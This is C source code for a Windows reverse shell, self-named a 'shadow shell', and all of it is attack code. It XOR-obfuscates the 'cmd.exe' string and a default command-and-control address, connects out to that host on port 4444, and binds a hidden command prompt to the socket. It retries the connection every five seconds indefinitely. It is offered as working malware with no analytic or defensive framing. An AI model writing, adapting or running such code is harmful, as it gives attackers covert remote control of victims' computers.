#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <winsock2.h>
#include <windows.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

/* linked at compile: cl.exe /link ws2_32.lib */

#define C2_DEFAULT_PORT 4444
#define RECONNECT_MS    5000
#define MAX_RETRIES     0
#define XOR_KEY         0x41

static const unsigned char xCmd[] = {
    0x22, 0x2C, 0x25, 0x6F, 0x24, 0x39, 0x24
};
#define xCmd_LEN 7

static const unsigned char xC2Addr[] = {
    0x70, 0x78, 0x73, 0x6F, 0x70, 0x77, 0x79, 0x6F,
    0x70, 0x6F, 0x70, 0x71, 0x71
};
#define xC2Addr_LEN 13

static void XorDecode(unsigned char *buf, int len) {
    int i;
    for (i = 0; i < len; i++) buf[i] ^= XOR_KEY;
}

static SOCKET EstablishChannel(const char *c2ip, int c2port) {
    SOCKET sock;
    struct sockaddr_in target;
    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (sock == INVALID_SOCKET) return INVALID_SOCKET;
    target.sin_family = AF_INET;
    target.sin_port = htons((unsigned short)c2port);
    target.sin_addr.s_addr = inet_addr(c2ip);
    if (WSAConnect(sock, (SOCKADDR *)&target, sizeof(target),
                   NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
        closesocket(sock);
        return INVALID_SOCKET;
    }
    return sock;
}

static void SendBanner(SOCKET sock) {
#ifdef VDR_DEBUG
    const char *banner =
        "\r\n"
        "  \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97"
        " \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97"
        " \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97"
        " \xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97"
        "   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\r\n"
        "              V A D E R\r\n"
        "     shadow shell - system context active\r\n"
        "\r\n";
    send(sock, banner, (int)strlen(banner), 0);
#endif
}

static void SpawnShell(SOCKET sock) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    unsigned char cmd[8];
    memcpy(cmd, xCmd, sizeof(xCmd));
    XorDecode(cmd, xCmd_LEN);
    cmd[xCmd_LEN] = 0;
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput = (HANDLE)sock;
    si.hStdOutput = (HANDLE)sock;
    si.hStdError = (HANDLE)sock;
    CreateProcessA(NULL, (LPSTR)cmd, NULL, NULL, TRUE,
                   CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    WSADATA wsData;
    SOCKET channel;
    int attempts = 0;
    char c2ip[64];
    int c2port = C2_DEFAULT_PORT;
    unsigned char ipBuf[64];
    (void)hInst; (void)hPrev; (void)nShow;
    if (lpCmd && lpCmd[0]) {
        c2ip[0] = 0;
        sscanf(lpCmd, "%63s %d", c2ip, &c2port);
    }
    if (!lpCmd || !lpCmd[0] || !c2ip[0]) {
        memcpy(ipBuf, xC2Addr, xC2Addr_LEN);
        XorDecode(ipBuf, xC2Addr_LEN);
        ipBuf[xC2Addr_LEN] = 0;
        strncpy(c2ip, (char *)ipBuf, sizeof(c2ip) - 1);
        c2ip[sizeof(c2ip) - 1] = 0;
        memset(ipBuf, 0, sizeof(ipBuf));
    }
    if (WSAStartup(MAKEWORD(2, 2), &wsData) != 0) return 1;
    while (MAX_RETRIES == 0 || attempts < MAX_RETRIES) {
        channel = EstablishChannel(c2ip, c2port);
        if (channel != INVALID_SOCKET) {
            SendBanner(channel);
            SpawnShell(channel);
            closesocket(channel);
            attempts = 0;
        } else {
            attempts++;
        }
        Sleep(RECONNECT_MS);
    }
    WSACleanup();
    return 0;
}
